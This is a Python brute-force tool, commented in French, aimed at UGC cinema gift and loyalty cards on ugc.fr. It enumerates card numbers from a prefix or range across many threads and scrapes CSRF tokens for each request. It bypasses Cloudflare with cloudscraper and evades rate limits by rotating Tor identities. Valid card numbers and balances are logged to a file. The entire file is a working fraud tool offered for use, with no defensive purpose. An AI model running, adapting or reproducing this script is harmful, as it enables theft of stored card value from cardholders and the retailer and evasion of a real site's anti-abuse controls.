#!/usr/bin/env python3
"""
UGC gift card / loyalty card balance checker + brute forcer
Cible: ugc.fr/les-offres-ugc.html — champ "N° de carte"

pip install cloudscraper beautifulsoup4 requests stem
Usage:
  python ugc_card.py --check 1234567890123456     # check une carte
  python ugc_card.py --brute --prefix 335 --len 16 --threads 10
  python ugc_card.py --brute --start 3350000000000000 --end 3350000000010000
"""

import re, time, random, argparse, threading, queue, sys
from datetime import datetime
from bs4 import BeautifulSoup

import requests, urllib3
urllib3.disable_warnings()

try:
    import cloudscraper
    def make_sess(tor=False):
        s = cloudscraper.create_scraper(browser={"browser":"chrome","platform":"windows"})
        if tor:
            s.proxies = {"http":"socks5h://127.0.0.1:9050","https":"socks5h://127.0.0.1:9050"}
        s.headers.update({"Accept-Language":"fr-FR,fr;q=0.9","Referer":"https://www.ugc.fr/"})
        return s
except ImportError:
    def make_sess(tor=False):
        s = requests.Session(); s.verify = False
        if tor:
            s.proxies = {"http":"socks5h://127.0.0.1:9050","https":"socks5h://127.0.0.1:9050"}
        s.headers.update({
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36",
            "Accept-Language":"fr-FR,fr;q=0.9","Referer":"https://www.ugc.fr/"
        })
        return s

PAGE_URL = "https://www.ugc.fr/les-offres-ugc.html"
# L'endpoint POST sera trouvé via inspection du form
# Candidats probables:
FORM_CANDIDATES = [
    "https://www.ugc.fr/les-offres-ugc.html",
    "https://www.ugc.fr/carte/solde",
    "https://www.ugc.fr/carte/check",
    "https://www.ugc.fr/api/carte/solde",
    "https://www.ugc.fr/cartes/solde",
]

SUCCESS_KW = ["solde","places","€","crédit","validité","expire","illimité","votre carte","points"]
ERROR_KW   = ["introuvable","invalide","incorrect","not found","erreur","numéro incorrect"]

def parse_form(html: str):
    """Trouve l'action du form + champs cachés (CSRF etc)."""
    soup = BeautifulSoup(html, "html.parser")
    # cherche le form qui contient le champ carte
    for form in soup.find_all("form"):
        inputs = form.find_all("input")
        names  = [i.get("name","").lower() for i in inputs]
        if any("carte" in n or "card" in n or "numero" in n for n in names):
            action  = form.get("action","")
            if not action.startswith("http"):
                action = "https://www.ugc.fr" + action
            # collecte tous les hidden inputs
            hidden = {}
            for inp in inputs:
                if inp.get("type","").lower() == "hidden":
                    hidden[inp.get("name","")] = inp.get("value","")
            # trouve le nom du champ carte
            card_field = "numeroCarte"
            for inp in inputs:
                nm = inp.get("name","").lower()
                if "carte" in nm or "card" in nm or "numero" in nm:
                    card_field = inp.get("name", card_field)
                    break
            return action or PAGE_URL, hidden, card_field
    return PAGE_URL, {}, "numeroCarte"

def probe_endpoint(sess):
    """Inspecte la page pour trouver l'action du form."""
    print("[*] Inspecting UGC card page...")
    try:
        r = sess.get(PAGE_URL, timeout=12)
        print(f"  [GET] {PAGE_URL} → {r.status_code}")
        if r.status_code == 200:
            action, hidden, card_field = parse_form(r.text)
            print(f"  [FORM] action={action}")
            print(f"  [FORM] card_field={card_field}")
            if hidden:
                for k,v in hidden.items():
                    print(f"  [HIDDEN] {k}={v[:20]}...")
            return action, hidden, card_field, r.text
    except Exception as e:
        print(f"  [!] {e}")
    return PAGE_URL, {}, "numeroCarte", ""

def check_card(num: str, sess, action: str, hidden: dict, card_field: str) -> dict:
    num = str(num).strip()
    try:
        # re-seed cookies pour chaque check
        r0 = sess.get(PAGE_URL, timeout=10)
        if r0.status_code == 429:
            return {"num": num, "valid": None, "balance": None, "details": "RATE_LIMITED"}

        # parse fresh CSRF
        _, fresh_hidden, _ = parse_form(r0.text)
        payload = dict(fresh_hidden)  # CSRF + autres hidden
        payload[card_field] = num

        r = sess.post(action, data=payload, timeout=12, allow_redirects=True)

        if r.status_code == 429:
            return {"num": num, "valid": None, "balance": None, "details": "RATE_LIMITED"}

        low  = r.text.lower()
        soup = BeautifulSoup(r.text, "html.parser")

        if any(k in low for k in ERROR_KW):
            return {"num": num, "valid": False, "balance": None, "details": "carte invalide"}

        if any(k in low for k in SUCCESS_KW):
            # tente d'extraire le solde
            balance = None
            for pat in [r"\d+[.,]\d+\s*€", r"€\s*\d+", r"\d+\s*places?"]:
                m = re.search(pat, r.text, re.I)
                if m:
                    balance = m.group(0).strip()
                    break
            # ou via element HTML
            if not balance:
                for cls in ["solde","balance","credit","montant","places"]:
                    el = soup.find(class_=re.compile(cls, re.I))
                    if el:
                        balance = el.get_text(strip=True)[:50]
                        break
            details = balance or "carte valide (solde non parsé)"
            return {"num": num, "valid": True, "balance": balance, "details": details}

        return {"num": num, "valid": None, "balance": None, "details": f"HTTP {r.status_code} ambigu"}

    except Exception as e:
        return {"num": num, "valid": None, "balance": None, "details": str(e)[:60]}

# ─── BRUTE FORCE ──────────────────────────────────────────────────────────────
LOCK   = threading.Lock()
FOUND  = []
STATS  = {"checked": 0, "valid": 0, "rate": 0}
STOP   = threading.Event()

def worker(work_q: queue.Queue, out_file: str, delay: float,
           action: str, hidden: dict, card_field: str, use_tor: bool):
    sess      = make_sess(tor=use_tor)
    rate_hits = 0

    while not STOP.is_set():
        try:
            num = work_q.get(timeout=2)
        except queue.Empty:
            break

        res = check_card(num, sess, action, hidden, card_field)

        if res["details"] == "RATE_LIMITED":
            with LOCK:
                STATS["rate"] += 1
            rate_hits += 1
            work_q.put(num)
            if rate_hits >= 3:
                # essai rotation Tor
                try:
                    from stem import Signal
                    from stem.control import Controller
                    with Controller.from_port(port=9051) as c:
                        c.authenticate(); c.signal(Signal.NEWNYM)
                    sess = make_sess(tor=True)
                    with LOCK: print("\n  [🔄] Tor rotated")
                except Exception:
                    time.sleep(30)
                rate_hits = 0
            else:
                time.sleep(5 + random.uniform(0,3))
            work_q.task_done()
            continue

        with LOCK:
            STATS["checked"] += 1
            c     = STATS["checked"]
            total = c + work_q.qsize()
            pct   = (c / max(total,1)) * 100

            if res["valid"] is True:
                STATS["valid"] += 1
                FOUND.append(res)
                line = f"💳 VALID CARD: {res['num']} | solde: {res['balance']}"
                print(f"\n  ✅ {line}")
                with open(out_file, "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now().isoformat()} | {line}\n")

            print(f"  [{c:>6}/{total}] {pct:5.1f}%  valid={STATS['valid']}  "
                  f"429={STATS['rate']}  last={num}", end="\r", flush=True)

        time.sleep(delay + random.uniform(0, delay * 0.3))
        work_q.task_done()

def run_brute(nums, threads, delay, out_file, action, hidden, card_field, use_tor):
    random.shuffle(nums)
    q = queue.Queue()
    for n in nums: q.put(str(n))

    print(f"[*] {len(nums)} cartes | {threads} threads | delay={delay}s | tor={'on' if use_tor else 'off'}")
    print(f"[*] Endpoint: {action}")
    print(f"[*] Output: {out_file}")
    print("─"*60)

    ts = [threading.Thread(target=worker,
          args=(q, out_file, delay, action, hidden, card_field, use_tor),
          daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    try:
        q.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted"); STOP.set()
    for t in ts: t.join(timeout=3)

    print(f"\n\n{'═'*60}")
    print(f"  Checked : {STATS['checked']}")
    print(f"  Valid   : {STATS['valid']}")
    if FOUND:
        print(f"\n  💳 CARTES VALIDES:")
        for r in FOUND:
            print(f"     {r['num']} — solde: {r['balance']}")
    print('═'*60)

def main():
    p = argparse.ArgumentParser(description="UGC card balance checker")
    p.add_argument("--check",   help="Vérifie une seule carte")
    p.add_argument("--brute",   action="store_true")
    p.add_argument("--start",   type=int, help="Numéro de départ")
    p.add_argument("--end",     type=int, help="Numéro de fin")
    p.add_argument("--prefix",  default="335", help="Préfixe des cartes")
    p.add_argument("--len",     type=int, default=13, help="Longueur totale du numéro")
    p.add_argument("--count",   type=int, default=1000)
    p.add_argument("--threads", type=int, default=5)
    p.add_argument("--delay",   type=float, default=1.0)
    p.add_argument("--output",  default="ugc_cards_valid.txt")
    p.add_argument("--tor",     action="store_true")
    args = p.parse_args()

    sess = make_sess(tor=args.tor)
    action, hidden, card_field, page_html = probe_endpoint(sess)

    if args.check:
        res = check_card(args.check, sess, action, hidden, card_field)
        if res["valid"] is True:
            print(f"\n✅ VALID — solde: {res['balance']}")
        elif res["valid"] is False:
            print(f"\n❌ INVALID — {res['details']}")
        else:
            print(f"\n❓ Inconnu — {res['details']}")
        return

    if args.brute:
        if args.start and args.end:
            nums = list(range(args.start, args.end + 1))
        else:
            # génère des numéros avec le préfixe donné
            pad = args.len - len(args.prefix)
            start = int(args.prefix) * (10 ** pad)
            nums  = [start + i for i in range(args.count)]
        run_brute(nums, args.threads, args.delay, args.output, action, hidden, card_field, args.tor)
    else:
        p.print_help()

if __name__ == "__main__":
    main()
